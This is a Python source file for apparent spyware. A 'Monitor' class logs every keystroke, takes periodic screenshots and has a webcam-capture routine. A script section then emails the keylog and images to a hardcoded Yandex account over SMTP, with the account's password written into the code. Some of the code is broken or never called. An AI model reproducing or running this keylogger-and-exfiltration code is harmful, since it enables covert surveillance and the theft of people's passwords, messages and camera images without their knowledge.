import time
import os
import smtplib
import cv2
from pip._vendor.urllib3.connectionpool import xrange

from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
from threading import Timer, Thread


from pynput.keyboard import Listener


class IntervalTimer(Timer):
    def run(self):
        while not self.finished.wait(self.interval):
            self.function(*self.args, **self.kwargs)


class Monitor:

    def _on_press(self, k):
        with open('./logs/keylogs/log.txt', 'a') as f:
            f.write('{}\t\t{}\n'.format(k, time.time()))


    def _build_logs(self):
        if not os.path.exists('./logs'):
            os.mkdir('./logs')
            os.mkdir('./logs/screenshots')
            os.mkdir('./logs/keylogs')

    def _keylogger(self):
        with Listener(on_press=self._on_press) as listener:
            listener.join()

    def _screenshot(self):
        import autopy
        bitmap = autopy.bitmap.capture_screen()
        bitmap.save('name_of_the_image.png')

    def _camera(self):
        camera_port = 0

        ramp_frames = 30

        camera = cv2.VideoCapture(camera_port)

        def get_image():
            # read is the easiest way to get a full image out of a VideoCapture object.
            retval, im = camera.read()
            return im

        for i in xrange(ramp_frames):
            temp = get_image()
        print("Taking image...")

        camera_capture = get_image()
        file = "test_image.png"
        cv2.imwrite(file, camera_capture)
        del (camera)


    def run(self, interval=1):
        self._build_logs()
        Thread(target=self._keylogger).start()
        IntervalTimer(interval, self._screenshot).start()


if __name__ == '__main__':
    mon = Monitor()
    mon.run()

'''Email'''
email_user = 'leh4pidor@yandex.ru'
email_password = 'rodip4hel'
email_send = 'leh4pidor@yandex.ru'

subject = 'Project'

msg = MIMEMultipart()
msg['From'] = 'StuxnetVox@live.com'
msg['To'] = 'any-email-to-show@outlook.com'
msg['Subject'] = 'Project'

body = 'Project directly from Python!'
msg.attach(MIMEText(body, 'plain'))

filename = 'logs\keylogs\log.txt '
attachment = open(filename, 'rb')

filename2 = 'name_of_the_image.png'
attachment2 = open(filename2, 'rb')

filename3 = 'test_image.png'
attachment3 = open(filename3, 'rb')

part = MIMEBase('application', 'octet-stream')
part1 = MIMEBase('application', 'octet-stream')
part2 = MIMEBase('application', 'octet-stream')
part.set_payload((attachment).read())
part1.set_payload((attachment2).read())
part2.set_payload((attachment3).read())

encoders.encode_base64(part)
encoders.encode_base64(part1)
encoders.encode_base64(part2)

part.add_header('Content-Disposition', "attachment; filename= " + filename)
part1.add_header('Content-Disposition', "attachment; filename= " + filename2)
part2.add_header('Content-Disposition', "attachment; filename= " + filename3)

msg.attach(part)
msg.attach(part1)
msg.attach(part2)

text = msg.as_string()
text1 = msg.as_string()
text2 = msg.as_string()

server = smtplib.SMTP('smtp.yandex.ru', 587)
server.starttls()
server.login(email_user, email_password)

server.sendmail(email_user, email_send, text)
server.quit()

